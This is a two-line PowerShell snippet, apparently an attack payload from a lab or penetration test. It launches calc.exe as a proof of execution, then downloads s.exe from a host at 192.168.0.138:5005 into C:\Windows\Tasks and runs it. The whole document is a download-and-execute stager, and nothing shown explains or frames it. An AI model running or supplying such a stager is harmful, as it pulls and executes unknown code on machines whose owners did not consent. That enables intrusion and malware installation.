Start-Process "calc.exe"
Invoke-WebRequest -Uri "http://192.168.0.138:5005/s.exe" -OutFile "C:\Windows\Tasks\s.exe"; Start-Process -FilePath "C:\Windows\Tasks\s.exe" -Wait